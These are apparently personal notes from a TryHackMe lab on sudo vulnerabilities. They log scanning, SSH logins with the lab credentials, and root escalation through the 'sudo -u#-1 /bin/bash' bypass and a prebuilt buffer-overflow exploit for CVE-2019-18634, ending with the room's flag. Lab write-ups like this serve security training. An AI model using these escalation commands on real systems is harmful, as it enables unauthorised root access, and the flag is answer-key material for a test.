```


Bufferoverflow via CVE-2019-18634
https://tryhackme.com/room/sudovulnsbof

IP Address:
10.10.200.233
10.10.230.54

Creds:
Username: tryhackme
Password: tryhackme
```

```
11:56 AM 1/7/2023
ping 10.10.200.233
```

```
11:58 AM 1/7/2023
nmap -sC -sV -oA nmap 10.10.200.233
#host down trying -Pn as well
nmap -sC -sV -Pn -oA nmap 10.10.200.233

2222/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
4444/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
```

```
12:09 PM 1/7/2023
ssh -p 2222 tryhackme@10.10.200.233
```

```
12:11 PM 1/7/2023
sudo -l
	Matching Defaults entries for tryhackme on sudo-privesc:
		env_reset, mail_badpass,
		secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

	User tryhackme may run the following commands on sudo-privesc:
		(ALL, !root) NOPASSWD: /bin/bash
```

```
12:16 PM 1/7/2023
sudo -u#-1 /bin/bash 
	tryhackme@sudo-privesc:~$ sudo -u#-1 /bin/bash 
	root@sudo-privesc:~# 
```

```
12:22 PM 1/7/2023
NEW IP ADDRESS:
10.10.230.54
```

```
12:23 PM 1/7/2023
ssh -p 4444 tryhackme@10.10.230.54 
```

```
12:23 PM 1/7/2023
sudo -V
Sudo version 1.8.21p2
Sudoers policy plugin version 1.8.21p2
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.21p2
```

```
12:25 PM 1/7/2023
ls
./exploit # uses bufferoverflow correelated with 
https://www.exploit-db.com/exploits/47995
```

```
12:28 PM 1/7/2023
# id
uid=0(root) gid=0(root) groups=0(root),1000(tryhackme)
```

```
11:40 AM 1/7/2023
ping 10.10.234.67

11:43 AM 1/7/2023
nmap -sC -sV -oA nmap 10.10.234.67 

2222/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
4444/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)

11:45 AM 1/7/2023
ssh -p 2222 tryhackme@10.10.234.67

11:46 AM 1/7/2023
sudo -l

	User tryhackme may run the following commands on sudo-privesc:
		(ALL, !root) NOPASSWD: /bin/bash
	
11:48 AM 1/7/2023
https://www.exploit-db.com/exploits/47502

sudo -u#-1 /bin/bash 

	tryhackme@sudo-privesc:~$ sudo -u#-1 /bin/bash 
	root@sudo-privesc:~# whoami
	root
	root@sudo-privesc:~# 
	
11:52 AM 1/7/2023
cat /root/root.txt

	THM{l33t_s3cur1ty_bypass}
```


